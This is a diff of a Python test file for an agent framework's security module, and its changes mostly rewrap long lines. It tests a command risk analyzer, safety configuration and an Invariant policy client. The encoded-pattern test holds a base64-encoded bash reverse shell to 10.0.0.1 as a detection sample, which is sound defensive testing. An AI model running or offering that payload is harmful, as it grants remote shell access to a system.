@@ -12,9 +12,17 @@ import pytest
 from forge.events.action import CmdRunAction, IPythonRunCellAction, MessageAction
 from forge.events.action.action import ActionSecurityRisk
 from forge.events.event import EventSource
-from forge.security import CommandAnalyzer, CommandRiskAssessment, SecurityAnalyzer, options
+from forge.security import (
+    CommandAnalyzer,
+    CommandRiskAssessment,
+    SecurityAnalyzer,
+    options,
+)
 from forge.security import __getattr__ as security_getattr
-from forge.security.command_analyzer import CommandAnalyzer as CommandAnalyzerClass, RiskCategory
+from forge.security.command_analyzer import (
+    CommandAnalyzer as CommandAnalyzerClass,
+    RiskCategory,
+)
 from forge.security.invariant.analyzer import InvariantAnalyzer
 from forge.security.invariant.client import InvariantClient
 from forge.security.invariant.nodes import Message
@@ -63,7 +71,9 @@ def test_command_analyzer_detects_risks(command: str, expected_category: RiskCat
     assert assessment.matched_patterns
 
 
-def test_command_analyzer_detects_encoded_and_custom_patterns(caplog: pytest.LogCaptureFixture):
+def test_command_analyzer_detects_encoded_and_custom_patterns(
+    caplog: pytest.LogCaptureFixture,
+):
     encoded_command = "echo YmFzaCAtaSAmPiYgL2Rldi90Y3AvMTAuMC4wLjEvMjI="
     analyzer = CommandAnalyzer(
         {
@@ -99,7 +109,9 @@ class DummyAction(SimpleNamespace):
 
 
 @pytest.mark.asyncio
-async def test_security_analyzers_base_and_llm_behavior(caplog: pytest.LogCaptureFixture):
+async def test_security_analyzers_base_and_llm_behavior(
+    caplog: pytest.LogCaptureFixture,
+):
     base = SecurityAnalyzer()
     with pytest.raises(NotImplementedError):
         await base.handle_api_request(None)  # type: ignore[arg-type]
@@ -130,7 +142,9 @@ def test_security_options_registry_contains_expected_analyzers():
 def test_safety_config_defaults_and_overrides():
     config = SafetyConfig()
     assert config.enable_enhanced_risk_detection is True
-    custom = SafetyConfig(risk_threshold="medium", blocked_patterns=[r"danger"], enable_risk_alerts=False)
+    custom = SafetyConfig(
+        risk_threshold="medium", blocked_patterns=[r"danger"], enable_risk_alerts=False
+    )
     assert custom.risk_threshold == "medium"
     assert custom.blocked_patterns == [r"danger"]
     assert custom.enable_risk_alerts is False
@@ -169,7 +183,13 @@ def test_invariant_client_successful_session(monkeypatch: pytest.MonkeyPatch):
 def test_invariant_client_close_session_error(monkeypatch: pytest.MonkeyPatch):
     monkeypatch.setattr(InvariantClient, "timeout", 0)
     client = InvariantClient("http://localhost:9999")
-    monkeypatch.setattr(httpx, "delete", lambda *args, **kwargs: (_ for _ in ()).throw(httpx.TimeoutException("timeout")))
+    monkeypatch.setattr(
+        httpx,
+        "delete",
+        lambda *args, **kwargs: (_ for _ in ()).throw(
+            httpx.TimeoutException("timeout")
+        ),
+    )
     err = client.close_session()
     assert isinstance(err, Exception)
 
@@ -218,7 +238,9 @@ def make_stub_client(result, error=None):
 
 @pytest.mark.asyncio
 async def test_invariant_analyzer_security_risk_edge_cases():
-    analyzer = InvariantAnalyzer(client=make_stub_client(["PolicyViolation(... risk=high ...)"]))
+    analyzer = InvariantAnalyzer(
+        client=make_stub_client(["PolicyViolation(... risk=high ...)"])
+    )
     risk = await analyzer.security_risk(MessageAction("hello"))
     assert risk == ActionSecurityRisk.HIGH
 
@@ -249,9 +271,22 @@ def test_parser_utilities_and_state(caplog: pytest.LogCaptureFixture):
 
     trace: list[ToolCall] = []
     assert get_next_id(trace) == "1"
-    trace.append(ToolCall(id="1", type="function", function=Function(name="tool", arguments={})))
+    trace.append(
+        ToolCall(id="1", type="function", function=Function(name="tool", arguments={}))
+    )
     assert get_next_id(trace) == "2"
-    assert get_last_id([ToolCall(id="3", type="function", function=Function(name="tool", arguments={}))]) == "3"
+    assert (
+        get_last_id(
+            [
+                ToolCall(
+                    id="3",
+                    type="function",
+                    function=Function(name="tool", arguments={}),
+                )
+            ]
+        )
+        == "3"
+    )
 
     action = MessageAction("assistant content")
     action._source = EventSource.AGENT
@@ -263,7 +298,11 @@ def test_parser_utilities_and_state(caplog: pytest.LogCaptureFixture):
 
     observation = SimpleNamespace(content="tool output")
     tool_output = parse_observation(
-        [ToolCall(id="5", type="function", function=Function(name="tool", arguments={}))],
+        [
+            ToolCall(
+                id="5", type="function", function=Function(name="tool", arguments={})
+            )
+        ],
         observation,
     )
     assert tool_output
@@ -309,10 +348,14 @@ def test_invariant_analyzer_use_existing_client_handles_missing_server():
     assert analyzer.api_server is None
 
 
-def test_invariant_analyzer_setup_docker_client_handles_failure(monkeypatch: pytest.MonkeyPatch):
+def test_invariant_analyzer_setup_docker_client_handles_failure(
+    monkeypatch: pytest.MonkeyPatch,
+):
     analyzer = InvariantAnalyzer.__new__(InvariantAnalyzer)
     analyzer._initialize_basic_attributes(None)
-    failing_module = SimpleNamespace(from_env=lambda: (_ for _ in ()).throw(RuntimeError("no docker")))
+    failing_module = SimpleNamespace(
+        from_env=lambda: (_ for _ in ()).throw(RuntimeError("no docker"))
+    )
     monkeypatch.setattr(f"{InvariantAnalyzer.__module__}.docker", failing_module)
     analyzer._setup_docker_client()
     assert analyzer.docker_client is None
@@ -352,7 +395,9 @@ def test_invariant_analyzer_container_management(monkeypatch: pytest.MonkeyPatch
     assert started["value"] is True
 
     # Exercise wait loop where status becomes running
-    analyzer.docker_client = SimpleNamespace(containers=SimpleNamespace(get=lambda name: SimpleNamespace(status="running")))
+    analyzer.docker_client = SimpleNamespace(
+        containers=SimpleNamespace(get=lambda name: SimpleNamespace(status="running"))
+    )
     analyzer.container = SimpleNamespace(status="created")
     analyzer._wait_for_container_ready()
 
@@ -383,7 +428,9 @@ def test_invariant_analyzer_create_new_container(monkeypatch: pytest.MonkeyPatch
     assert analyzer.api_port == 4321
 
 
-def test_invariant_analyzer_create_new_client_with_fallback(monkeypatch: pytest.MonkeyPatch):
+def test_invariant_analyzer_create_new_client_with_fallback(
+    monkeypatch: pytest.MonkeyPatch,
+):
     analyzer = InvariantAnalyzer.__new__(InvariantAnalyzer)
     analyzer._initialize_basic_attributes("sid-1")
 
@@ -400,13 +447,18 @@ def test_invariant_analyzer_create_new_client_with_fallback(monkeypatch: pytest.
             self.session_id = sid
             self.Policy = SimpleNamespace(get_template=lambda: (None, None))
             self.Monitor = SimpleNamespace(
-                from_string=lambda rule: SimpleNamespace(check=lambda past, pending: ([], None))
+                from_string=lambda rule: SimpleNamespace(
+                    check=lambda past, pending: ([], None)
+                )
             )
 
-    monkeypatch.setattr("forge.security.invariant.analyzer.InvariantClient", DummyClient)
+    monkeypatch.setattr(
+        "forge.security.invariant.analyzer.InvariantClient", DummyClient
+    )
     analyzer._create_new_client()
     assert analyzer.api_port == 9876
     assert analyzer.api_server == f"{analyzer.api_host}:9876"
+
 
 def test_invariant_analyzer_setup_container_creates_new():
     analyzer = InvariantAnalyzer.__new__(InvariantAnalyzer)
@@ -429,7 +481,10 @@ def test_invariant_analyzer_setup_container_creates_new():
     assert created["called"] is True
     assert analyzer.container.status == "running"
 
-def test_invariant_analyzer_wait_for_container_handles_lookup_failure(caplog: pytest.LogCaptureFixture):
+
+def test_invariant_analyzer_wait_for_container_handles_lookup_failure(
+    caplog: pytest.LogCaptureFixture,
+):
     analyzer = InvariantAnalyzer.__new__(InvariantAnalyzer)
     analyzer._initialize_basic_attributes(None)
 
@@ -442,6 +497,7 @@ def test_invariant_analyzer_wait_for_container_handles_lookup_failure(caplog: py
     with caplog.at_level("DEBUG"):
         analyzer._wait_for_container_ready()
     assert analyzer.container is None
+
 
 @pytest.mark.asyncio
 async def test_invariant_analyzer_security_risk_normalizes_unexpected_response():
@@ -470,9 +526,13 @@ async def test_invariant_analyzer_security_risk_normalizes_unexpected_response()
 
 
 @pytest.mark.asyncio
-async def test_invariant_analyzer_close_handles_exception(caplog: pytest.LogCaptureFixture):
+async def test_invariant_analyzer_close_handles_exception(
+    caplog: pytest.LogCaptureFixture,
+):
     analyzer = InvariantAnalyzer.__new__(InvariantAnalyzer)
-    analyzer.container = SimpleNamespace(stop=lambda: (_ for _ in ()).throw(RuntimeError("fail")))
+    analyzer.container = SimpleNamespace(
+        stop=lambda: (_ for _ in ()).throw(RuntimeError("fail"))
+    )
     analyzer.docker_client = None
     with caplog.at_level("DEBUG"):
         await analyzer.close()
@@ -543,11 +603,18 @@ def test_invariant_client_policy_monitor_success(monkeypatch: pytest.MonkeyPatch
         def json(self):
             return self._data
 
-    monkeypatch.setattr(httpx, "post", lambda *args, **kwargs: DummyPolicyResponse({"policy_id": "pid", "monitor_id": "mid"}))
+    monkeypatch.setattr(
+        httpx,
+        "post",
+        lambda *args, **kwargs: DummyPolicyResponse(
+            {"policy_id": "pid", "monitor_id": "mid"}
+        ),
+    )
     policy = client.Policy.from_string("rule")
     assert policy.policy_id == "pid"
     monitor = client.Monitor.from_string("rule")
     assert monitor.monitor_id == "mid"
+
 
 def test_invariant_client_init_raises_on_session_error(monkeypatch: pytest.MonkeyPatch):
     def fake_create(self, session_id=None):  # type: ignore[override]
@@ -557,41 +624,60 @@ def test_invariant_client_init_raises_on_session_error(monkeypatch: pytest.Monke
     with pytest.raises(RuntimeError):
         InvariantClient("http://localhost:9999")
 
+
 def test_invariant_client_create_session_error_paths(monkeypatch: pytest.MonkeyPatch):
     client = InvariantClient.__new__(InvariantClient)
     client.server = "http://localhost:9999"
     client.timeout = 1
 
-    monkeypatch.setattr(httpx, "get", lambda *a, **k: (_ for _ in ()).throw(httpx.HTTPError("bad")))
+    monkeypatch.setattr(
+        httpx, "get", lambda *a, **k: (_ for _ in ()).throw(httpx.HTTPError("bad"))
+    )
     session_id, err = InvariantClient._create_session(client)
     assert session_id is None
     assert isinstance(err, httpx.HTTPError)
 
-    monkeypatch.setattr(httpx, "get", lambda *a, **k: (_ for _ in ()).throw(ValueError("boom")))
+    monkeypatch.setattr(
+        httpx, "get", lambda *a, **k: (_ for _ in ()).throw(ValueError("boom"))
+    )
     session_id, err = InvariantClient._create_session(client)
     assert session_id is None
     assert isinstance(err, ValueError)
 
+
 def test_invariant_client_policy_template_error(monkeypatch: pytest.MonkeyPatch):
     monkeypatch.setattr(InvariantClient, "timeout", 0)
     client = InvariantClient("http://localhost:9999")
-    monkeypatch.setattr(httpx, "get", lambda *a, **k: (_ for _ in ()).throw(httpx.TimeoutException("late")))
+    monkeypatch.setattr(
+        httpx,
+        "get",
+        lambda *a, **k: (_ for _ in ()).throw(httpx.TimeoutException("late")),
+    )
     template, err = client.Policy.get_template()
     assert template is None
     assert isinstance(err, httpx.TimeoutException)
 
-def test_invariant_client_policy_and_monitor_error_responses(monkeypatch: pytest.MonkeyPatch):
+
+def test_invariant_client_policy_and_monitor_error_responses(
+    monkeypatch: pytest.MonkeyPatch,
+):
     monkeypatch.setattr(InvariantClient, "timeout", 0)
     client = InvariantClient("http://localhost:9999")
     client.Policy.policy_id = "pid"
     client.Monitor.monitor_id = "mid"
 
-    monkeypatch.setattr(httpx, "post", lambda *a, **k: (_ for _ in ()).throw(httpx.HTTPError("policy")))
+    monkeypatch.setattr(
+        httpx, "post", lambda *a, **k: (_ for _ in ()).throw(httpx.HTTPError("policy"))
+    )
     result, err = client.Policy.analyze([{}])
     assert result is None
     assert isinstance(err, httpx.HTTPError)
 
-    monkeypatch.setattr(httpx, "post", lambda *a, **k: (_ for _ in ()).throw(httpx.TimeoutException("monitor")))
+    monkeypatch.setattr(
+        httpx,
+        "post",
+        lambda *a, **k: (_ for _ in ()).throw(httpx.TimeoutException("monitor")),
+    )
     result, err = client.Monitor.check([], [])
     assert result is None
     assert isinstance(err, httpx.TimeoutException)
@@ -599,4 +685,3 @@ def test_invariant_client_policy_and_monitor_error_responses(monkeypatch: pytest
 
 def test_default_policy_constant():
     assert "Disallow secrets" in DEFAULT_INVARIANT_POLICY
-
